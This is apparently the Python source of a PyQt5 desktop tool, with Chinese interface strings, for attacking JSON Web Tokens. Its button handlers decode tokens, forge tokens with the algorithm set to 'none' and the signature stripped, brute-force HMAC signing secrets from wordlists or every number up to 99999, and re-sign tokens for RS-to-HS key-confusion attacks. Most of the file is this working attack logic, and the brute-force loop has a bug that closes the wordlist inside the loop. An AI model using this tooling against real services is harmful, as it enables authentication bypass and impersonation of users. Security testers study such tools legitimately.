# -*- coding: utf-8 -*-

"""
Module implementing MainWindow.
"""
import base64
import json
import os
from collections import OrderedDict
import jwt

from PyQt5.QtCore import pyqtSlot
from PyQt5.QtWidgets import QMainWindow, QApplication, QFileDialog
import Jwt_code
from Ui_jwt_GUI import Ui_MainWindow


class MainWindow(QMainWindow, Ui_MainWindow):
    """
    Class documentation goes here.
    """

    def __init__(self, parent=None):
        """
        Constructor
        
        @param parent reference to the parent widget
        @type QWidget
        """
        super(MainWindow, self).__init__(parent)
        self.setupUi(self)

    @pyqtSlot()
    def on_pushButton_clicked(self):
        # 解密按钮
        """
        Slot documentation goes here.
        """
        # TODO: not implemented yet
        try:
            self.textBrowser_4.clear()
            self.textBrowser_4.append(
                '---------------->提示：请检查您输入的JWT是否是x.x.x或者x.x.的形式，如果不是请自行补充.<---------------')
            self.textBrowser_4.append('---------------->提示：已经为您修正base64-padding<---------------')
            jwt = self.lineEdit.text()
            headers = str(Jwt_code.get_headers(jwt))
            self.textBrowser_2.setText(headers)
            payload = str(Jwt_code.get_payload(jwt))
            self.textBrowser_5.setText(payload)
            signature = str(Jwt_code.get_signature(jwt))
            self.textBrowser_6.setText(signature)
            self.textBrowser_4.append('---------------->提示：已经为您解密完成<---------------')
        except Exception as e:
            self.textBrowser_4.append("程序运行出错，请检查你的参数，报错如下:" + str(e))
    @pyqtSlot()
    def on_pushButton_2_clicked(self):
        # 清空所有内容
        """
        Slot documentation goes here.
        """
        # TODO: not implemented yet
        self.lineEdit.clear()
        self.lineEdit_2.clear()
        self.textBrowser.clear()
        self.textBrowser_4.clear()
        self.textBrowser_6.clear()
        self.textBrowser_5.clear()
        self.textBrowser_2.clear()
        self.lineEdit_3.clear()
        self.lineEdit_4.clear()
        self.textBrowser_4.setText('------------->内容已经清空<--------------')

    @pyqtSlot()
    def on_pushButton_3_clicked(self):
        # 加密按钮
        """
        Slot documentation goes here.
        """
        # TODO: not implemented yet
        try:
            self.textBrowser_4.append("--------------->提示：正在为你进行加密jwt<----------------\n")
            headers = self.textBrowser_2.toPlainText()
            headers = headers.replace("'", "\"")  # 将单引号替换为双引号，这是因为json.loads
            print(headers, "headers的类型为：：：：：：" + str(type(headers)))
            payload = self.textBrowser_5.toPlainText()
            signature = self.textBrowser_6.toPlainText()
            new_jwt = f'{headers}.{payload}.{signature}'
            self.textBrowser_4.clear()
            self.textBrowser_4.append(f"为您加密的原始数据:{new_jwt}")
            headers = json.loads(headers)
            payload = json.loads(payload)
            # 这里改用pyjwt 因此传入需要json对象，就无需进行下面两行，不然就会报错!
            # payload = base64.urlsafe_b64encode(payload.encode()).decode('utf8')
            # headers = base64.urlsafe_b64encode(headers.encode()).decode('utf8')
            key = self.lineEdit_4.text()
            alg = self.lineEdit_5.text()
            self.textBrowser_4.append(f'您的加密算法为{alg}')
            encoded = jwt.encode(payload=payload, key=key, algorithm=alg, headers=headers)
            self.textBrowser_4.append("--------------->提示：加密jwt完成<----------------\n")
            self.textBrowser_4.append('提示：php的jwt可能需要的形式为————> [headers.payload.signature]-------')
            self.textBrowser_4.append('--------------->提示：你也许需要自己删除jwt中末尾的=号！<----------------\n')
            # new_jwt = f'{headers}.{payload}.{signature}'
            self.textBrowser.setText(encoded)
        except Exception as e:
            self.textBrowser_4.append("程序运行出错，请检查你的参数，报错如下:" + str(e))
    # headers 2
    # payload 5
    # signature 6

    @pyqtSlot()
    def on_pushButton_4_clicked(self):
        # None攻击
        """
        Slot documentation goes here.
        """
        # TODO: not implemented yet
        try:
            self.textBrowser_4.clear()
            self.textBrowser_4.append('---------------->None攻击提示<---------------')
            self.textBrowser_4.append('提示：None攻击是把alg字段自动替换为None和删除signature并返回加密结果')
            self.textBrowser_4.append('提示：假如你不需要payload中某个字段的值，请将None攻击结果解密后自行更改')
            self.textBrowser_4.append('提示：一般None攻击需要保留最后的.')

            # 获取headers并更改alg为None
            headers = self.textBrowser_2.toPlainText()
            print(type(headers))
            # 将字符类型转为字典后方便更改alg的值
            headers = json.loads(headers)
            print(headers, type(headers))
            headers['alg'] = 'none'
            headers = str(headers)
            # 将payload拿过来
            payload = self.textBrowser_5.toPlainText()
            # 无需signature 直接加密前两个
            payload = base64.urlsafe_b64encode(payload.encode()).decode('utf8')
            headers = base64.urlsafe_b64encode(headers.encode()).decode('utf8')
            new_jwt = f'{headers}.{payload}'
            self.textBrowser.setText(new_jwt)
        except Exception as e:
            self.textBrowser_4.append("程序运行出错，请检查你的参数，报错如下:" + str(e))
    @pyqtSlot()
    def on_pushButton_5_clicked(self):
        """
        Slot documentation goes here.
        """
        # TODO: not implemented yet
        try:
            import requests
            url = self.lineEdit_2.text()
            if url == '':
                self.textBrowser_4.append('请您先输入url再点击按钮')
            else:
                res = requests.get(url)
                self.textBrowser.setText(str(res.headers))
        except Exception as e:
            self.textBrowser_4.append("程序运行出错，请检查你的参数，报错如下:" + str(e))
    @pyqtSlot()
    def on_pushButton_6_clicked(self):
        """
        Slot documentation goes here.
        """
        # TODO: not implemented yet
        # 选择字典
        try:
            dict_name = QFileDialog.getOpenFileName()
            self.lineEdit_3.setText(dict_name[0])
        except Exception as e:
            self.textBrowser_4.append("程序运行出错，请检查你的参数，报错如下:" + str(e))
    @pyqtSlot()
    def on_pushButton_7_clicked(self):
        """
        Slot documentation goes here.
        """
        # TODO: not implemented yet
        # 爆破按钮
        try:

            import json
            jwt_str = self.lineEdit.text()
            headers = Jwt_code.get_headers(jwt_str)
            print("处理前的headers:",headers)
            # 保持json的顺序。因为json是无顺序的。这里我们必须保持顺序
            headers = json.loads(headers,object_pairs_hook=OrderedDict)
            # 再转换为普通字典对象，方便传入jwt.encode
            headers = dict(headers)
            print("处理后的haeaders:------------>", headers)
            payload = Jwt_code.get_payload(jwt_str)
            payload = json.loads(payload)
            # print("payload-------->", payload)
            dict_file = self.lineEdit_3.text()
            dict_file = open(dict_file, 'r')
            dict_key = dict_file.readlines()
            self.textBrowser_4.clear()
            self.textBrowser_4.append('提示：字典已经成功加载')
            for i in dict_key:

                self.textBrowser_4.append(f'正在尝试的密钥{i}')
                QApplication.processEvents()
                # 先暂定为hs256，后期加上combox加密算法
                alg = self.lineEdit_5.text()
                key = i.strip()
                print(key)
                encoded = jwt.encode(payload=payload, key=key, algorithm=alg, headers=headers)
                print("加密后的：",encoded)
                print("输入的jwt_str:",jwt_str)
                if encoded == jwt_str:
                    print("爆破成功")
                    self.textBrowser_4.append('------------>爆破成功!!!!!!<----------------')
                    self.textBrowser.setText(f'----->爆破出来的密钥是:{key}')
                    self.lineEdit_4.setText(f'{key}')
                    break
                self.textBrowser_4.append('爆破失败，请尝试更换字典')
                # 关闭文件描述符，防止内存泄漏
                dict_file.close()
        except Exception as e:
            self.textBrowser_4.append("程序运行出错，请检查你的参数，报错如下:" + str(e))
    @pyqtSlot()
    def on_pushButton_8_clicked(self):
        """
        Slot documentation goes here.
        """
        # TODO: not implemented yet
        # 使用默认字典
        try:
            self.textBrowser_4.clear()
            self.lineEdit_3.setText('./password.txt')
            self.textBrowser_4.append('提示：默认1000弱口令字典已加载')
        except Exception as e:
            self.textBrowser_4.append("程序运行出错，请检查你的参数，报错如下:" + str(e))
    @pyqtSlot()
    def on_pushButton_9_clicked(self):
        """
        Slot documentation goes here.
        """
        # TODO: not implemented yet
        # 纯数字爆破
        try:
            self.textBrowser_4.clear()
            self.textBrowser_4.append(
                '-------->提示：默认爆破五位数以内，假如程序卡住了不要急，因为没有多线程，让子弹飞一会！@Aiyflowers<-------------')
            jwt_str = self.lineEdit.text()
            headers = Jwt_code.get_headers(jwt_str)
            headers = json.loads(headers)
            # print("headers------------>", headers)
            payload = Jwt_code.get_payload(jwt_str)
            payload = json.loads(payload)
            # print("payload-------->", payload)
            for i in range(1, 99999):
                self.textBrowser_4.append(f'正在尝试的密钥{i}')
                QApplication.processEvents()
                # 先暂定为hs256，后期加上combox加密算法
                alg = self.lineEdit_5.text()
                key = str(i)
                encoded = jwt.encode(payload=payload, key=key, algorithm=alg, headers=headers)
                if encoded == jwt_str:
                    print("爆破成功")
                    self.textBrowser_4.append('------------>爆破成功!!!!!!<----------------')
                    self.textBrowser.append(f'----->爆破出来的密钥是:{key}')
                    self.lineEdit_4.setText(f'{key}')
                    break
        except Exception as e:
            self.textBrowser_4.append("程序运行出错，请检查你的参数，报错如下:" + str(e))
    @pyqtSlot(str)
    def on_comboBox_activated(self, p0):
        # alg加密算法下拉菜单框
        """
        Slot documentation goes here.
        
        @param p0 DESCRIPTION
        @type str
        """
        # TODO: not implemented yet
        self.lineEdit_5.setText(p0)

    @pyqtSlot()
    def on_pushButton_10_clicked(self):
        """
        Slot documentation goes here.
        """
        # TODO: not implemented yet]
        try:
            # 3位纯字母爆破
            self.textBrowser_4.clear()
            self.textBrowser_4.append('此字典是由26个英文字母随机3位组合！')
            self.textBrowser_4.append('已经为你加载了字典，请点击爆破key按钮即可开始')
            self.lineEdit_3.setText('./zimu.txt')
        except Exception as e:
            self.textBrowser_4.append("程序运行出错，请检查你的参数，报错如下:" + str(e))
    @pyqtSlot()
    def on_pushButton_11_clicked(self):
        """
        Slot documentation goes here.
        """
        # TODO: not implemented yet
        # 调用浏览器打开外部网站jwt.io
        os.startfile('https://jwt.io/')

    @pyqtSlot()
    def on_pushButton_12_clicked(self):
        """
        Slot documentation goes here.
        """
        # TODO: not implemented yet
        # 调用浏览器打开外部网站掘金在线加密jwt
        os.startfile('https://tooltt.com/jwt-encode/')

    @pyqtSlot()
    def on_pushButton_13_clicked(self):
        """
        Slot documentation goes here.
        """
        # TODO: not implemented yet
        # 调用浏览器打开我的个人博客
        os.startfile('https:www.Aiyf.love')

    @pyqtSlot()
    def on_pushButton_14_clicked(self):
        """
        Slot documentation goes here.
        """
        # TODO: not implemented yet
        try:
            # 加载私钥位置 私钥显示在lineEdit_6
            private_key = QFileDialog.getOpenFileName()
            self.lineEdit_6.setText(private_key[0])
            self.textBrowser_4.clear()
            self.textBrowser_4.append('提示：私钥加载完成，请确定您的私钥无误！！！')
        except Exception as e:
            self.textBrowser_4.append("程序运行出错，请检查你的参数，报错如下:" + str(e))
    @pyqtSlot()
    def on_pushButton_15_clicked(self):
        """
        Slot documentation goes here.
        """
        # TODO: not implemented yet
        try:
            # RS256加密
            private_key = self.lineEdit_6.text()
            public = open(private_key, 'r').read()
            print(public)
            headers = self.textBrowser_2.toPlainText()
            payload = self.textBrowser_5.toPlainText()
            # signature = self.textBrowser_6.toPlainText()
            headers = json.loads(headers)
            payload = json.loads(payload)
            alg = self.lineEdit_5.text()
            new_jwt = (jwt.encode(headers=headers, payload=payload, key=public, algorithm=alg))
            self.textBrowser.setText(new_jwt)
            self.textBrowser_4.clear()
            self.textBrowser_4.append(f'利用私钥的{alg}算法加密完成！如果失败请确定您的私钥是否正确')
            self.textBrowser_4.append('利用修改RS为HS的公钥攻击可能无效，如果对方服务器上的jwt由node.js生成！！')
        except Exception as e:
            self.textBrowser_4.append("程序运行出错，请检查你的参数，报错如下:" + str(e))


if __name__ == "__main__":
    import sys
    import cgitb

    cgitb.enable(format='text')
    app = QApplication(sys.argv)
    ui = MainWindow()
    ui.show()
    sys.exit(app.exec_())
